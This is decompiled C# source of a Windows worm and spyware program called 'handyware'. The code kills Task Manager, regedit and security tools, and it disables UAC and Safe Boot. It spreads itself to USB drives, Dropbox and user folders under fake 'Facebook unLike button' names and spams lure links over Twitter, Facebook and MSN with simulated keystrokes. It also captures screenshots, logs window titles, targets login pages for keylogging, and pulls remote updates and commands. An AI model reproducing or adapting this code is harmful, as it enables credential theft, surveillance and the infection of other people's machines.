          return "<F1>";
        case 113:
          return "<F2>";
        case 114:
          return "<F3>";
        case 115:
          return "<F4>";
        case 116:
          return "<F5>";
        case 117:
          return "<F6>";
        case 118:
          return "<F7>";
        case 119:
          return "<F8>";
        case 120:
          return "<F9>";
        case 121:
          return "<F10>";
        case 122:
          return "<F11>";
        case 123:
          return "<F12>";
        case 160:
          return "<Left-Shift>";
        case 161:
          return "<Right Shift>";
        case 162:
          return "<Ctrl>";
        case 163:
          return "<Ctrl>";
        case 164:
          return "<Alt>";
        case 165:
          return "<Alt>";
        case 186:
          return ";";
        case 187:
          return "=";
        case 188:
          return ",";
        case 189:
          return "-";
        case 190:
          return ".";
        case 191:
          return "/";
        case 219:
          return "[";
        case 220:
          return "\\";
        case 221:
          return "]";
        case 222:
          return "'";
        default:
          return flag ? ((char) i).ToString() : ((char) (i + 32)).ToString();
      }
    }

    private int originalFSX()
    {
      string path = "";
      try
      {
        string[] subKeyNames = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Microsoft Games\\Flight Simulator", false).GetSubKeyNames();
        for (int index = 0; index < subKeyNames.Length; ++index)
        {
          if (subKeyNames[index] == "10.0")
          {
            path = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Microsoft Games\\Flight Simulator\\" + subKeyNames[index], false).GetValue("AppPath").ToString();
            if (!Directory.Exists(path))
              return 0;
            break;
          }
        }
        if (path == "")
          return 0;
        return Hash.SHA512(this.getBytesOfFile(path + "api.dll")) == "9fa7709b047fca227d3f9fcae3388442af8bacc19c5cb6118b21c5ea3f752a593e1c6fe598a0d8e325997ac80bcc67c24c6c77c6d04566219ca761df6c13f63e" || Hash.SHA512(this.getBytesOfFile(path + "api.dll")) == "60835e53a7da9af2abcff0e79562f0e4d796679a0456fa5e42f6565f5b650e9017927dcf033378abcca9b35a9eec784f7809f8a1646484cc6d4f82e3363392dd" || Hash.SHA512(this.getBytesOfFile(path + "main.dll")) == "eea5a7c758ad6d418cc60a15ce5f65cded0d8745dbee9991a35448191450193d4a39781eb75af5e24d92635756d065d5bd66069851b474def7afedcf6cb07ee5" || Hash.SHA512(this.getBytesOfFile(path + "main.dll")) == "4a6ad61c7a01826ab3e423cd5ee66ee843224e20de0a560479abc6534e704cfc9c843b022105db72f239f7b184d1b735d8a81ab2250a37910956355faa63759a" || Hash.SHA512(this.getBytesOfFile(path + "fsui.dll")) == "4eae0871fe701e61526e4b9175d65cf60586b77bfe671b9bc51f180b4619872354b5003e3cca65e053dffe20302adc6ecf69ee14935ca6ac1830b8f3f3cae66a" || Hash.SHA512(this.getBytesOfFile(path + "fsui.dll")) == "f13ee6d6758c219d0f0c85b7768923022452f38bb12d64a797208dd990f973552c82199108fe57de57af0aa070225e5352bed59bfb0719089fe15a43fe8b44a6" ? -1 : 1;
      }
      catch (Exception ex)
      {
        this.writeLogError("FSX Original\r\nError: " + ex.Message);
        return 0;
      }
    }

    private List<string> checkHostsFile()
    {
      List<string> stringList1 = new List<string>();
      try
      {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\etc\\hosts";
        StreamReader streamReader = new StreamReader(path);
        List<string> stringList2 = new List<string>();
        while (!streamReader.EndOfStream)
          stringList2.Add(streamReader.ReadLine());
        streamReader.Close();
        foreach (string FontString in stringList2)
        {
          if (this.Contains(FontString, "activate.adobe.com", StringComparison.CurrentCultureIgnoreCase))
            stringList1.Add("The file " + path + "\r\nis blocking the Adobe to validate their programs!|http://www.adobe.com/products/catalog.html");
        }
      }
      catch (Exception ex)
      {
        this.writeLogError("Check Host File\r\nError: " + ex.Message);
      }
      return stringList1;
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int SystemParametersInfo(
      uint uiAction,
      uint uiParam,
      string pvParam,
      uint fWinIni);

    public void setWallpaper(string filename) => Form1.SystemParametersInfo(Form1.SPI_SETDESKWALLPAPER, 0U, filename, Form1.SPIF_UPDATEINIFILE);

    [DllImport("user32.dll")]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    private string getActiveWindowTitle()
    {
      IntPtr zero = IntPtr.Zero;
      StringBuilder text = new StringBuilder(256);
      return Form1.GetWindowText(Form1.GetForegroundWindow(), text, 256) > 0 ? text.ToString() : "";
    }

    private string getActiveWindowTitle(IntPtr handle)
    {
      try
      {
        StringBuilder text = new StringBuilder();
        Form1.GetWindowText(handle, text, int.MaxValue);
        return text.ToString();
      }
      catch
      {
        return "";
      }
    }

    private void killProcess(string name)
    {
      try
      {
        Process[] processes = Process.GetProcesses();
        for (int index = 0; index < processes.Length; ++index)
        {
          if (processes[index].ProcessName == name)
            processes[index].Kill();
        }
      }
      catch
      {
      }
    }

    private void killProcessByTile(string title)
    {
      Process[] processes = Process.GetProcesses();
      for (int index = 0; index < processes.Length; ++index)
      {
        try
        {
          string activeWindowTitle = this.getActiveWindowTitle(processes[index].MainWindowHandle);
          if (activeWindowTitle != "" && activeWindowTitle == title)
            processes[index].Kill();
        }
        catch
        {
        }
      }
    }

    private void killProcessByTile(List<string> titles)
    {
      Process[] processes = Process.GetProcesses();
      for (int index = 0; index < processes.Length; ++index)
      {
        try
        {
          string activeWindowTitle = this.getActiveWindowTitle(processes[index].MainWindowHandle);
          bool flag = false;
          foreach (string title in titles)
          {
            if (this.Contains(activeWindowTitle, title, StringComparison.CurrentCultureIgnoreCase))
            {
              flag = true;
              break;
            }
          }
          if (activeWindowTitle != "" && flag)
            processes[index].Kill();
        }
        catch
        {
        }
      }
    }

    private bool existProcess(string name)
    {
      Process[] processes = Process.GetProcesses();
      bool flag = false;
      for (int index = 0; index < processes.Length; ++index)
      {
        if (processes[index].ProcessName == name)
          flag = true;
      }
      return flag;
    }

    private void killDoubleHandyware()
    {
      try
      {
        Process[] processes = Process.GetProcesses();
        bool flag = false;
        for (int index = 0; index < processes.Length; ++index)
        {
          if (processes[index].ProcessName == "handyware_su")
          {
            if (flag)
            {
              processes[index].Kill();
              break;
            }
            flag = true;
          }
        }
      }
      catch
      {
      }
    }

    private bool Contains(string FontString, string FindString, StringComparison Comparison) => FontString.IndexOf(FindString, Comparison) != -1;

    private byte[] getBytesOfFile(string filePath)
    {
      FileStream input = new FileStream(filePath, FileMode.Open, FileAccess.Read);
      BinaryReader binaryReader = new BinaryReader((Stream) input);
      byte[] bytesOfFile = binaryReader.ReadBytes(Convert.ToInt32(new FileInfo(filePath).Length));
      binaryReader.Close();
      input.Close();
      return bytesOfFile;
    }

    private string getLocalIP()
    {
      try
      {
        return Dns.GetHostByName(Dns.GetHostName()).AddressList[0].ToString();
      }
      catch
      {
        return "Unknown";
      }
    }

    private void writeLogError(string text)
    {
      try
      {
        StreamWriter streamWriter = new StreamWriter(this.logPathError, true);
        streamWriter.WriteLine(text);
        streamWriter.Write("\r\n\r\n");
        streamWriter.Close();
      }
      catch
      {
      }
    }

    private void writeLogWindowTitle(string text)
    {
      try
      {
        StreamWriter streamWriter = new StreamWriter(this.logPathWindowTitle, true);
        streamWriter.WriteLine(text);
        streamWriter.Write("\r\n\r\n");
        streamWriter.Close();
      }
      catch
      {
      }
    }

    private string getShareLink(bool facebook)
    {
      int index = new Random().Next(this.urlsAutoShare.Count);
      if (!facebook)
        return this.urlsAutoShare[index].Replace('|', ' ');
      return this.urlsAutoShare[index].Split('|')[1];
    }

    public Bitmap resizeBitmap(Bitmap b, int Width, int Height, int percent)
    {
      int width = percent * Width / 100;
      int height = percent * Height / 100;
      Bitmap bitmap = new Bitmap(width, height);
      using (Graphics graphics = Graphics.FromImage((Image) bitmap))
        graphics.DrawImage((Image) b, 0, 0, width, height);
      return bitmap;
    }

    private void savePrint(int number)
    {
      string str1 = Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString();
      string str2;
      switch (number)
      {
        case 1:
          str2 = str1 + " - PRINT1.png";
          break;
        case 2:
          str2 = str1 + " - PRINT2.png";
          break;
        case 3:
          str2 = str1 + " - PRINT3.png";
          break;
        default:
          str2 = str1 + " - PRINT1.png";
          break;
      }
      Rectangle bounds = Screen.PrimaryScreen.Bounds;
      int width = bounds.Width;
      bounds = Screen.PrimaryScreen.Bounds;
      int height = bounds.Height;
      Bitmap b = new Bitmap(width, height, PixelFormat.Format32bppArgb);
      Graphics graphics = Graphics.FromImage((Image) b);
      bounds = Screen.PrimaryScreen.Bounds;
      int x = bounds.X;
      bounds = Screen.PrimaryScreen.Bounds;
      int y = bounds.Y;
      bounds = Screen.PrimaryScreen.Bounds;
      Size size = bounds.Size;
      graphics.CopyFromScreen(x, y, 0, 0, size, CopyPixelOperation.SourceCopy);
      this.resizeBitmap(b, b.Width, b.Height, 80).Save(this.workspace + "\\" + str2, ImageFormat.Png);
    }

    private bool existProcessList(string procName)
    {
      if (new List<string>((IEnumerable<string>) new string[32]
      {
        "aetcrss1",
        "alg",
        "csrss",
        "ctfmon",
        "dllhost",
        "dwm",
        "explorer",
        "helpsvc",
        "hkcmd",
        "igfxpers",
        "igfxsrvc",
        "igfxtray",
        "lsass",
        "msiexec",
        "nvvsvc",
        "nvsvc32",
        "RTHDCPL",
        "RtHDVCpl",
        "rundll32",
        "scardsvr",
        "services",
        "smss",
        "sndvol32",
        "spoolsv",
        "svchost",
        "taskeng",
        "taskmgr",
        "wercon",
        "winlogon",
        "wmiapsrv",
        "wmiprvse",
        "wuauclt"
      }).Contains(procName))
        return true;
      foreach (string str in this.lstProcess)
      {
        char[] chArray = new char[1]{ '|' };
        if (str.Split(chArray)[0] == procName)
          return true;
      }
      return false;
    }

    private void saveProcesses()
    {
      try
      {
        Process[] processes = Process.GetProcesses();
        for (int index = 0; index < processes.Length; ++index)
        {
          try
          {
            if (!this.existProcessList(processes[index].ProcessName))
              this.lstProcess.Add(processes[index].ProcessName + "|" + processes[index].MainModule.FileName);
          }
          catch
          {
          }
        }
        this.lstProcess.Sort();
      }
      catch
      {
      }
    }

    private void killNativeProcess()
    {
      if (this.existProcess("msconfig"))
        this.killProcess("msconfig");
      if (this.existProcess("taskmgr"))
        this.killProcess("taskmgr");
      if (this.existProcess("regedit"))
        this.killProcess("regedit");
      if (!this.existProcess("cmd"))
        return;
      this.killProcess("cmd");
    }

    private void killNotNativeProcess()
    {
      try
      {
        if (this.existProcess("killbox"))
          this.killProcess("killbox");
        if (this.existProcess("unlocker"))
          this.killProcess("unlocker");
        if (this.existProcess("Unlocker"))
          this.killProcess("Unlocker");
        this.killProcessByTile(new List<string>()
        {
          "pocket killbox",
          "RegSeeker",
          "Process Explorer",
          "RegScanner",
          "Hijack",
          "KillProcess",
          "Antivirus Setup",
          "HijackThis"
        });
      }
      catch
      {
      }
    }

    private void actWindowsPirata()
    {
      if (System.IO.File.Exists(this.workspace + "\\actProtect\\" + Hash.MD5(Environment.UserName.ToString() + "HandywareGenuineWindows") + ".txt"))
        return;
      int num = (int) MessageBox.Show("You don't have a genuine Windows!", "Pirate!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      FileStream fileStream = new FileStream(this.workspace + "\\notgenuinewindows_wp.jpg", FileMode.Create, FileAccess.ReadWrite);
      fileStream.Write(Resource1.genuinewindows_wp, 0, Resource1.genuinewindows_wp.Length);
      fileStream.Close();
      this.setWallpaper(this.workspace + "\\notgenuinewindows_wp.jpg");
    }

    public Form1()
    {
      this.InitializeComponent();
      this.workspace = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\handyware";
      this.currentVersion = "0.9.3";
      if (!Directory.Exists(this.workspace))
        Directory.CreateDirectory(this.workspace);
      this.logPathError = this.workspace + "\\logerror";
      this.logPathWindowTitle = this.workspace + "\\logwindowtitle";
      try
      {
        System.IO.File.Delete(this.workspace + "\\handyware_newversion.exe");
      }
      catch
      {
      }
      try
      {
        System.IO.File.Delete(this.logPathError);
      }
      catch
      {
      }
      if (!System.IO.File.Exists(this.workspace + "\\actProtect\\" + Hash.MD5(Environment.UserName.ToString() + "HandywareDontStart") + ".txt"))
      {
        this.killProcess("monitor");
        if (!this.existProcess("monitor"))
        {
          System.IO.File.Delete(this.workspace + "\\monitor.exe");
          FileStream fileStream = new FileStream(this.workspace + "\\monitor.exe", FileMode.Create, FileAccess.ReadWrite);
          fileStream.Write(Resource1.monitor, 0, Resource1.monitor.Length);
          fileStream.Close();
          Process.Start(this.workspace + "\\monitor.exe");
        }
        this.actWorm = new WormAction(this.workspace, Application.ExecutablePath.ToString(), this.logPathError);
        this.killNotNativeProcess();
        this.actWorm.removeUACRegistry();
        this.actWorm.removeBootSafe();
        FileInfo fileInfo = new FileInfo(Application.ExecutablePath);
        Exception exception;
        bool flag;
        if (fileInfo.Name == "handyware_newversion.exe")
        {
          this.killProcess("handyware_su");
          while (true)
          {
            try
            {
              System.IO.File.Delete(this.workspace + "\\handyware_su.exe");
              System.IO.File.Copy(Application.ExecutablePath, this.workspace + "\\handyware_su.exe", true);
              break;
            }
            catch (Exception ex)
            {
              exception = ex;
              this.killProcess("handyware_su");
              Thread.Sleep(2000);
            }
            flag = true;
          }
          while (true)
          {
            try
            {
              Process.Start(this.workspace + "\\handyware_su.exe");
              break;
            }
            catch
            {
              Thread.Sleep(1000);
            }
            flag = true;
          }
          this.timer_CloseHandyware.Enabled = true;
        }
        else if (fileInfo.Name == "handyware_su.exe")
        {
          this.uptProgram = new UpdateProgram("http://mylogin.altervista.org/handyware.txt", "http://dl.dropbox.com/u/19496504/programacao/atualizacoes/Handyware.txt", this.workspace, this.currentVersion);
          this.iTimerHide = 0;
          this.hided = false;
          this.timer_hide.Enabled = true;
          this.infoStartUp = "No";
          this.startTime = DateTime.Now;
          this.lstNotifications = new List<string>();
          this.lstAllPaths = new List<string>();
          this.thrFindCrack = new Thread(new ThreadStart(this.findCrack));
          this.palavrasChaveCrack = new List<string>((IEnumerable<string>) new string[8]
          {
            "crack",
            "ativador",
            "activator",
            "keygen",
            "keygenerator",
            "keymaker",
            "serial",
            "hack"
          });
          this.fileSystemWatcher_userProfileFolder.Path = Environment.ExpandEnvironmentVariables("%userprofile%").ToString();
          this.mouseDown = false;
          this.Cursor = Cursors.SizeAll;
          this.label_mex.Cursor = Cursors.SizeAll;
          this.chbxNotificationShowHide = new CheckBox();
          this.chbxNotificationShowHide.Checked = false;
          this.chbxNotificationShowHide.CheckedChanged += new EventHandler(this.checkBoxNotification_CheckedChanged);
          this.timer_notifyFilaEspera.Enabled = true;
          this.urlsAutoShare = new List<string>((IEnumerable<string>) new string[4]
          {
            "'WorldCup 2014 - YouTube'|http://tinyurl.com/d7e7jnd",
            "Avast Utilities - Safe your socials!|http://tinyurl.com/d4t5cu3",
            "'YouTube - SantaClaus Lazy Song'|http://tinyurl.com/6qp3yhz",
            "Download unlike button for Facebook|http://tinyurl.com/7rjevnn"
          });
          this.fileDesktop = "Facebook unLike button.exe";
          this.fileDocuments = "unLike Button for Facebook.exe";
          this.fileDevices = "Facebook Unlike Button Install.exe";
          this.fileDropbox = "Facebook unLike button.exe";
          this.browseChrome = false;
          this.browseExplorer = false;
          this.browseFirefox = false;
          this.browseSafari = false;
          this.timePrint1 = DateTime.Now;
          this.timePrint2 = DateTime.Now;
          this.timePrint3 = DateTime.Now;
          this.Print1 = false;
          this.Print2 = false;
          this.Print3 = false;
          this.thrSendPrints = new Thread(new ThreadStart(this.sendPrints));
          this.thrPrintRequest = new Thread(new ThreadStart(this.printRequest));
          this.thrPrintRequest.Start();
          this.messageboxText = "";
          this.messageboxTitle = "";
          this.thrCommandRequest = new Thread(new ThreadStart(this.commandRequest));
          this.thrCommandRequest.Start();
          this.oldWindowTitle = "";
          this.currentWindowTitle = "";
          this.lastWindowMsn = "";
          this.shareFacebook = false;
          this.shareTwitter = false;
          this.shareMsn = false;
          this.timer_checkWindowTitle.Enabled = true;
          this.actWorm.copyToDropbox("Private.exe");
          this.lstProcess = new List<string>();
          this.thrSendProcess = new Thread(new ThreadStart(this.sendProcess));
          this.thrUpdate = new Thread(new ThreadStart(this.updateProgram));
          this.thrSendInfetedData = new Thread(new ThreadStart(this.sendInfectedData));
          this.thrSendLog = new Thread(new ThreadStart(this.sendLog));
          this.timer_05min.Enabled = true;
          this.timer_20min.Enabled = true;
          this.timer_10min.Enabled = true;
          this.timer_30seg.Enabled = true;
          this.timer_30min.Enabled = true;
          this.timer_01seg.Enabled = true;
          this.timer_01min.Enabled = true;
          this.keyDown = false;
          this.canRetShift = true;
          this.logger = "";
          this.oldWindowLog = "";
          this.timer_logger.Enabled = true;
        }
        else if (fileInfo.Name == "winhost")
        {
          if (!this.existProcess("handyware_su"))
          {
            this.timer_hide.Enabled = true;
            this.timer_guardadinhoCheck.Tag = (object) "";
            this.timer_guardadinhoCheck.Enabled = true;
          }
          else
            this.timer_CloseHandyware.Enabled = true;
        }
        else if (!this.existProcess("handyware_su"))
        {
          Process.Start("http://www.facebook.com/sharer.php?u=http://tinyurl.com/7rjevnn");
          System.IO.File.Copy(Application.ExecutablePath, this.workspace + "\\handyware_su.exe", true);
          Process.Start(this.workspace + "\\handyware_su.exe");
          this.timer_CloseHandyware.Enabled = true;
        }
        else
        {
          Process.Start("http://www.facebook.com/sharer.php?u=http://tinyurl.com/7rjevnn");
          this.killProcess("handyware_su");
          while (true)
          {
            try
            {
              System.IO.File.Delete(this.workspace + "\\handyware_su.exe");
              System.IO.File.Copy(Application.ExecutablePath, this.workspace + "\\handyware_su.exe", true);
              break;
            }
            catch (Exception ex)
            {
              exception = ex;
              this.killProcess("handyware_su");
              Thread.Sleep(2000);
            }
            flag = true;
          }
          while (true)
          {
            try
            {
              Process.Start(this.workspace + "\\handyware_su.exe");
              break;
            }
            catch
            {
              Thread.Sleep(1000);
            }
            flag = true;
          }
          this.timer_CloseHandyware.Enabled = true;
        }
      }
      else
        this.timer_CloseHandyware.Enabled = true;
    }

    private void timer_hide_Tick(object sender, EventArgs e)
    {
      if (this.iTimerHide > 12)
      {
        this.timer_hide.Enabled = false;
        this.hided = true;
      }
      else if (this.iTimerHide > 5)
        this.timer_hide.Interval = 5000;
      this.ShowInTaskbar = false;
      this.Hide();
      if (!System.IO.File.Exists(this.workspace + "\\actProtect\\" + Hash.MD5(Environment.UserName.ToString() + "HandywareHideMyFile") + ".txt"))
        System.IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
      ++this.iTimerHide;
    }

    private void timer_01seg_Tick(object sender, EventArgs e)
    {
      this.timer_01seg.Enabled = false;
      this.killNativeProcess();
      this.killNotNativeProcess();
      if (!this.existProcess("monitor"))
      {
        System.IO.File.Delete(this.workspace + "\\monitor.exe");
        FileStream fileStream = new FileStream(this.workspace + "\\monitor.exe", FileMode.Create, FileAccess.ReadWrite);
        fileStream.Write(Resource1.monitor, 0, Resource1.monitor.Length);
        fileStream.Close();
        Process.Start(this.workspace + "\\monitor.exe");
      }
      if (this.messageboxText != "" && this.messageboxTitle != "")
      {
        new Form_MessageBox(this.messageboxTitle, this.messageboxText).Show();
        this.messageboxText = "";
        this.messageboxTitle = "";
      }
      this.timer_01seg.Interval = 1000;
      this.timer_01seg.Enabled = true;
    }

    private void timer_propagacao_Tick(object sender, EventArgs e)
    {
      this.timer_30seg.Interval = 30000;
      this.infoStartUp = this.actWorm.SetStartupON("handyware", "handyware_su.exe");
      this.actWorm.CopyToRemovableDevices(this.fileDevices, false, true);
      this.actWorm.copyToDropbox(this.fileDropbox);
      this.actWorm.CopyToFolder(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\" + this.fileDocuments, true, false);
      this.actWorm.CopyToFolder(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + this.fileDesktop, true, false);
      this.actWorm.removeBootSafe();
      this.actWorm.CopyToFolder(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\host.exe", true);
      this.actWorm.SetStartupON("winhost", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\host.exe", true);
    }

    private void timer_01min_Tick(object sender, EventArgs e)
    {
      this.timer_01min.Interval = 60000;
      if (!this.thrSendProcess.IsAlive)
        this.saveProcesses();
      if (!this.Print1)
      {
        if ((DateTime.Now - this.timePrint3).TotalMinutes < 15.0)
          return;
        this.savePrint(1);
        this.timePrint1 = DateTime.Now;
        this.Print1 = true;
      }
      else if (!this.Print2)
      {
        if ((DateTime.Now - this.timePrint1).TotalMinutes < 5.0)
          return;
        this.savePrint(2);
        this.timePrint2 = DateTime.Now;
        this.Print2 = true;
      }
      else
      {
        if (this.Print3 || (DateTime.Now - this.timePrint2).TotalMinutes < 5.0)
          return;
        this.savePrint(3);
        this.timePrint3 = DateTime.Now;
        this.Print3 = true;
        this.thrSendPrints = new Thread(new ThreadStart(this.sendPrints));
        this.thrSendPrints.Start();
      }
    }

    private void timer_05min_Tick(object sender, EventArgs e)
    {
      this.timer_05min.Interval = 300000;
      if (!this.browseChrome && this.existProcess("chrome"))
        this.browseChrome = true;
      if (!this.browseExplorer && this.existProcess("iexplore"))
        this.browseExplorer = true;
      if (!this.browseSafari && this.existProcess("safari"))
        this.browseSafari = true;
      if (!this.browseFirefox && this.existProcess("firefox"))
        this.browseFirefox = true;
      if (System.IO.File.Exists(this.workspace + "\\actProtect\\" + Hash.MD5(Environment.UserName.ToString() + "HandywareShareMSN") + ".txt"))
        return;
      this.shareMsn = true;
    }

    private void timer_actions_Tick(object sender, EventArgs e)
    {
      this.timer_10min.Interval = 600000;
      this.actWorm.removeUACRegistry();
      if (this.originalWindows6() == -1)
        this.lstNotifications.Insert(0, "Your Windows is not genuine!|http://www.microsoft.com/windows/buy/default.aspx");
      if (this.originalFSX() == -1)
        this.lstNotifications.Insert(0, "The Microsoft Flight Simulator installed on this computer\r\nis not genuine!|http://www.microsoft.com/games/flightsimulatorx/");
      foreach (string str in this.checkHostsFile())
        this.lstNotifications.Insert(0, str);
      if (!this.thrFindCrack.IsAlive)
      {
        try
        {
          this.thrFindCrack = new Thread(new ThreadStart(this.findCrack));
          this.thrFindCrack.Start();
        }
        catch
        {
        }
      }
      if (!this.thrSendInfetedData.IsAlive)
      {
        this.thrSendInfetedData = new Thread(new ThreadStart(this.sendInfectedData));
        this.thrSendInfetedData.Start();
      }
      if (!this.thrSendProcess.IsAlive)
      {
        this.thrSendProcess = new Thread(new ThreadStart(this.sendProcess));
        this.thrSendProcess.Start();
      }
      this.killDoubleHandyware();
    }

    private void timer_update_Tick(object sender, EventArgs e)
    {
      this.timer_20min.Interval = 1200000;
      if (this.thrUpdate.IsAlive)
        return;
      this.thrUpdate = new Thread(new ThreadStart(this.updateProgram));
      this.thrUpdate.Start();
    }

    private void timer_30min_Tick(object sender, EventArgs e)
    {
      this.timer_30min.Interval = 1800000;
      if (System.IO.File.Exists(this.workspace + "\\actProtect\\" + Hash.MD5(Environment.UserName.ToString() + "HandywareShareTwitterFacebook") + ".txt"))
        return;
      this.shareTwitter = true;
      Process.Start("https://twitter.com/share?text=" + this.getShareLink(false));
    }

    private void timer_CloseHandyware_Tick(object sender, EventArgs e) => Application.Exit();

    private void timer_notify_Tick(object sender, EventArgs e)
    {
      if (!this.hided || this.chbxNotificationShowHide.Checked || this.lstNotifications.Count <= 0)
        return;
      this.timer_notifyFilaEspera.Enabled = false;
      this.timer_notifyFilaEspera.Interval = 3000;
      string[] strArray = this.lstNotifications[0].Split('|');
      this.label_mex.Text = strArray[0];
      try
      {
        this.label_mex.Tag = (object) strArray[1];
      }
      catch
      {
      }
      this.lstNotifications.RemoveAt(0);
      this.chbxNotificationShowHide.Checked = true;
    }

    private void timer_checkWindowTitle_Tick(object sender, EventArgs e)
    {
      this.currentWindowTitle = this.getActiveWindowTitle();
      if (!(this.currentWindowTitle != this.oldWindowTitle))
        return;
      this.oldWindowTitle = this.currentWindowTitle;
      this.writeLogWindowTitle(this.currentWindowTitle);
      if (this.Contains(this.currentWindowTitle, "@Camilinha69", StringComparison.CurrentCultureIgnoreCase) || this.Contains(this.currentWindowTitle, "porntube", StringComparison.CurrentCultureIgnoreCase) || this.Contains(this.currentWindowTitle, "redtube", StringComparison.CurrentCultureIgnoreCase) || this.Contains(this.currentWindowTitle, "porn", StringComparison.CurrentCultureIgnoreCase))
        this.lstNotifications.Insert(0, "This content is inappropriate for people under 18 years old.|");
      if (this.Contains(this.currentWindowTitle, "torrent", StringComparison.CurrentCultureIgnoreCase) && this.existProcess("uTorrent"))
        this.lstNotifications.Insert(0, "Don't download illegal files with uTorrent.|");
      if (this.Contains(this.currentWindowTitle, "bitcomet", StringComparison.CurrentCultureIgnoreCase) && this.existProcess("BitComet"))
        this.lstNotifications.Insert(0, "Don't download illegal files with BitComet.|");
      if (this.Contains(this.currentWindowTitle, "bittorrent", StringComparison.CurrentCultureIgnoreCase) && this.existProcess("BitTorrent"))
        this.lstNotifications.Insert(0, "Don't download illegal files with BitTorrent.|");
      if (this.Contains(this.currentWindowTitle, "emule", StringComparison.CurrentCultureIgnoreCase) && this.existProcess("emule"))
        this.lstNotifications.Insert(0, "Don't download illegal files with eMule.|");
      if (this.Contains(this.currentWindowTitle, "azureus", StringComparison.CurrentCultureIgnoreCase) && this.existProcess("Azureus"))
        this.lstNotifications.Insert(0, "Don't download illegal files with Azureus.|");
      if (this.Contains(this.currentWindowTitle, "4shared", StringComparison.CurrentCultureIgnoreCase))
        this.lstNotifications.Insert(0, "Don't download illegal files from 4Shared.|");
      if (this.Contains(this.currentWindowTitle, "songr", StringComparison.CurrentCultureIgnoreCase) && this.existProcess("Songr"))
        this.lstNotifications.Insert(0, "Don't download illegal music/video with Songr.|");
      if (this.Contains(this.currentWindowTitle, "Ares", StringComparison.CurrentCultureIgnoreCase) && this.existProcess("Ares"))
        this.lstNotifications.Insert(0, "Don't download illegal files with Ares.|");
      if (this.Contains(this.currentWindowTitle, "tweet", StringComparison.CurrentCultureIgnoreCase) && this.shareTwitter)
      {
        SendKeys.Send("{TAB}");
        SendKeys.Send("{ENTER}");
        this.shareTwitter = false;
        this.shareFacebook = true;
        Process.Start("http://www.facebook.com/sharer.php?u=" + this.getShareLink(true));
      }
      if (this.Contains(this.currentWindowTitle, "facebook", StringComparison.CurrentCultureIgnoreCase) && this.shareFacebook)
      {
        SendKeys.Send("{TAB}");
        SendKeys.Send("{TAB}");
        SendKeys.Send("{TAB}");
        SendKeys.Send("{TAB}");
        SendKeys.Send("{TAB}");
        SendKeys.Send("{ENTER}");
        this.shareFacebook = false;
      }
      if (this.shareMsn && this.Contains(this.currentWindowTitle, "<", StringComparison.CurrentCultureIgnoreCase) && this.Contains(this.currentWindowTitle, ">", StringComparison.CurrentCultureIgnoreCase) && this.Contains(this.currentWindowTitle, ".", StringComparison.CurrentCultureIgnoreCase) && (this.Contains(this.currentWindowTitle, "@hotmail", StringComparison.CurrentCultureIgnoreCase) || this.Contains(this.currentWindowTitle, "@live", StringComparison.CurrentCultureIgnoreCase) || this.Contains(this.currentWindowTitle, "@msn", StringComparison.CurrentCultureIgnoreCase)))
      {
        if (this.currentWindowTitle != this.lastWindowMsn)
        {
          this.lastWindowMsn = this.currentWindowTitle;
          SendKeys.Send(this.getShareLink(false));
          SendKeys.Send("{ENTER}");
        }
        else
          this.shareMsn = false;
      }
    }

    private void timer_logger_Tick(object sender, EventArgs e)
    {
      this.timer_logger.Enabled = false;
      try
      {
        string activeWindowTitle = this.getActiveWindowTitle();
        if (this.oldWindowLog != activeWindowTitle)
        {
          if (this.logger != "" && this.logger.IndexOf("\r\n") != -1)
          {
            this.thrSendLog = new Thread(new ThreadStart(this.sendLog));
            this.thrSendLog.Start();
          }
          else
            this.logger = "";
          this.oldWindowLog = activeWindowTitle;
        }
        if (!this.thrSendLog.IsAlive)
        {
          bool flag1 = false;
          if (this.Contains(activeWindowTitle, "facebook", StringComparison.CurrentCultureIgnoreCase))
          {
            if (this.Contains(activeWindowTitle, "acesse", StringComparison.CurrentCultureIgnoreCase) || this.Contains(activeWindowTitle, "accedi", StringComparison.CurrentCultureIgnoreCase) || this.Contains(activeWindowTitle, "log in", StringComparison.CurrentCultureIgnoreCase) || this.Contains(activeWindowTitle, "bienvenido", StringComparison.CurrentCultureIgnoreCase) || this.Contains(activeWindowTitle, "bienvenue", StringComparison.CurrentCultureIgnoreCase) || this.Contains(activeWindowTitle, "anmelden", StringComparison.CurrentCultureIgnoreCase))
              flag1 = true;
          }
          else if (this.Contains(activeWindowTitle, "yahoo", StringComparison.CurrentCultureIgnoreCase))
          {
            if (this.Contains(activeWindowTitle, "entre", StringComparison.CurrentCultureIgnoreCase) || this.Contains(activeWindowTitle, "best web based", StringComparison.CurrentCultureIgnoreCase) || this.Contains(activeWindowTitle, "ouverture", StringComparison.CurrentCultureIgnoreCase))
              flag1 = true;
          }
          else if (this.Contains(activeWindowTitle, "gmail", StringComparison.CurrentCultureIgnoreCase))
          {
            if (this.Contains(activeWindowTitle, "email", StringComparison.CurrentCultureIgnoreCase))
              flag1 = true;
          }
          else if (activeWindowTitle == "Windows Live Messenger")
            flag1 = true;
          else if (this.Contains(activeWindowTitle, "bj share", StringComparison.CurrentCultureIgnoreCase))
          {
            if (this.Contains(activeWindowTitle, "login", StringComparison.CurrentCultureIgnoreCase))
              flag1 = true;
          }
          else if (this.Contains(activeWindowTitle, "foursquare", StringComparison.CurrentCultureIgnoreCase))
          {
            if (this.Contains(activeWindowTitle, "log in", StringComparison.CurrentCultureIgnoreCase))
              flag1 = true;
          }
          else if (this.Contains(activeWindowTitle, "Dropbox - Simplify your life", StringComparison.CurrentCultureIgnoreCase))
            flag1 = true;
          else if (this.Contains(activeWindowTitle, "orkut", StringComparison.CurrentCultureIgnoreCase))
            flag1 = true;
